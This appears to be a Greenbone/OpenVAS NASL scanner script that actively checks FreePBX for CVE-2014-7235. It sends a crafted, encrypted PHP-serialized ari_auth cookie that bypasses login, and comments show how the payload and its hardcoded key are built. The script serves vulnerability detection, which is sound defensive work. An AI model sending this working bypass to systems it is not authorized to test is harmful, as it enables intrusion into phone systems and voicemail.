# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freepbx:freepbx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105195");
  script_version("2024-06-04T05:05:28+0000");
  script_tag(name:"last_modification", value:"2024-06-04 05:05:28 +0000 (Tue, 04 Jun 2024)");
  script_tag(name:"creation_date", value:"2015-02-06 16:04:47 +0100 (Fri, 06 Feb 2015)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2014-7235");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("FreePBX < 2.9.0.9, 2.10.x < 2.11.1.5 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_freepbx_http_detect.nasl");
  script_mandatory_keys("freepbx/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"FreePBX is prone to a remote command execution (RCE)
  vulnerability because the application fails to sufficiently sanitize input data.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"htdocs_ari/includes/login.php in the ARI Framework
  module/Asterisk Recording Interface (ARI) allows remote attackers to execute arbitrary code via
  the ari_auth coockie, related to the PHP unserialize function, as exploited in the wild in
  September 2014.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary
  commands in the context of the affected application.");

  script_tag(name:"affected", value:"FreePBX prior to version 2.9.0.9 and version  2.10.x prior to
  2.11.1.5.");

  script_tag(name:"solution", value:"Update to version 2.9.0.9, 2.11.1.5 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70188");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

# https://github.com/FreePBX/fw_ari/commit/f294b4580ce725ca3c5e692d86e63d40cef4d836
# https://github.com/FreePBX/cdr/blob/master/crypt.php
# http://code.freepbx.org/rdiff/FreePBX_SVN/freepbx/branches/2.3/amp_conf/htdocs/recordings/includes/main.conf.php?r1=4328&r2=6732&u&N
#
# $auth = 'a:2:{s:8:"username";b:1;s:8:"password";b:1;}';
# $auth = encrypt($auth, 'z1Mc6KRxA7Nw90dGjY5qLXhtrPgJOfeCaUmHvQT3yW8nDsI2VkEpiS4blFoBuZ');
# $md5 = md5($auth);
# urlencode('a:2:{i:0;s:88:"' . $auth  . '";i:1;s:32:"' . $md5  . '";}');

headers =  make_array( "Cookie", "ari_auth=a%3A2%3A%7Bi%3A0%3Bs%3A88%3A%22rT9bcNlEJv%2F1G9j9ZcqPUej1nt" +
                                 "SHDwlDvrv1pphLMel2lppX43z4E%2BF2Yc3In070LIWRFCh1wanriTUnYC8%2F%2Bg%3D" +
                                 "%3D%22%3Bi%3A1%3Bs%3A32%3A%224ffe329af509978387ac4af2fbb3a694%22%3B%7D");

url = dir + "/recordings/index.php";

req = http_get_req( port:port, url:url, add_headers:headers );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

if( ">Logout<" >< res && ">Call Monitor<" >< res && ">Voicemail<" >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
